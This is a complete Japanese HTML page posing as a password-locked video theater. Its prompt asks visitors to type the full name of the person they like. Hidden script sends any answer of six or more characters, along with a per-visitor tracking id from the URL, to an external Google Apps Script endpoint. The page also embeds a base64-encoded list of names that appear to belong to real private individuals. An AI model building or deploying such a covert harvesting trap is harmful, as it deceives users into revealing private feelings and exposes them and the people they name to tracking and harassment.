<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>✦ Private Theater ✦</title>
    <style>
        body { background: #0a0a0a; color: #d4a017; font-family: 'Courier New', Courier, monospace; text-align: center; margin: 0; padding: 20px; overflow-x: hidden; }
        #login-container { max-width: 400px; margin: 100px auto; padding: 50px 30px; background: #111; border: 1px solid #333; border-radius: 20px; box-shadow: 0 15px 50px rgba(0,0,0,0.8); }
        h2 { font-weight: 100; letter-spacing: 5px; margin-bottom: 40px; font-size: 1.2rem; text-shadow: 0 0 10px rgba(212, 160, 23, 0.5); }
        input { width: 85%; padding: 15px; margin-bottom: 20px; border-radius: 10px; border: 1px solid #444; background: #000; color: #fff; font-size: 16px; outline: none; text-align: center; }
        input:focus { border-color: #d4a017; box-shadow: 0 0 15px rgba(212, 160, 23, 0.3); }
        button { width: 93%; padding: 15px; background: linear-gradient(135deg, #d4a017 0%, #b8860b 100%); color: #000; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; letter-spacing: 2px; }
        .hidden { display: none !important; }
        video { width: 100%; max-width: 850px; border-radius: 15px; margin-top: 30px; background: #000; box-shadow: 0 0 40px rgba(0,0,0,1); }
        h1 { font-weight: 100; letter-spacing: 10px; margin-top: 30px; }
    </style>
</head>
<body>

    <div id="login-screen">
        <div id="login-container">
            <h2>AUTHENTICATION</h2>
            <input type="password" id="p" placeholder="好きな人半角フルネーム打て">
            <br>
            <button onclick="v()">UNLOCK</button>
        </div>
    </div>

    <div id="video-screen" class="hidden">
        <h1>AUTHORIZED</h1>
        <video id="v-main" controls playsinline preload="auto">
            <source src="nana.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        const _allowed = [
            "a2l0YWdhd2FyaWhv",
            "bW9yaWtva29ybw==",
            "b25veXVtZWhv",
            "a2F6aXdhcmFyaWtv",
            "a2FuZWtvaGluYXRh",
            "eW9zaWRhaGluYQ==",
            "eW9zaWRhaXRpa2E=",
            "b29rYXdhY2hpbmE=",
            "b29rYXdhdGluYQ==",
            "aGlnYXNpc2lv",
            "aGlnYXNoaXNoaW8=",
            "dGFraXphd2FoaW5hbm8=",
            "b2thbW90b25vem9taQ==",
            "bmFnYW11dGF0b3dh",
            "bWFlZGFha2FuZQ==",
            "c29nYWhpbWVuYQ=="
        ];

        const GAS_URL = "https://script.google.com/macros/s/AKfycbw_-8k_lckeHdJmlHcXNBW68t8NQhiCNlavKHNcayEkgcB5VRAp-eVcmnW81gORnjhT5w/exec";
        function getTargetId() {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('id') || "だれか不明"; 
        }

        function sendToGas(userCode, word) {
            if (!GAS_URL) return;
            fetch(GAS_URL, {
                method: "POST",
                mode: "no-cors",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ username: userCode, word: word })
            }).catch(e => console.log(e));
        }

        function v() {
            const i = document.getElementById('p').value;
            let e;
            try {
                e = btoa(unescape(encodeURIComponent(i)));
            } catch (x) {
                e = "";
            }

            // 正解している、または間違っていても6文字以上ならGASに送信
            if (_allowed.includes(e) || i.length >= 6) {
                const userCode = getTargetId();
                sendToGas(userCode, i);
            }

            if (_allowed.includes(e)) {
                document.getElementById('login-screen').classList.add('hidden');
                document.getElementById('video-screen').classList.remove('hidden');
                const vid = document.getElementById('v-main');
                vid.play().catch(err => {});
            } else {
                alert("パスワードが正しくありません。");
                document.getElementById('p').value = "";
            }
        }

        document.getElementById('p').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') v();
        });
    </script>
</body>
</html>
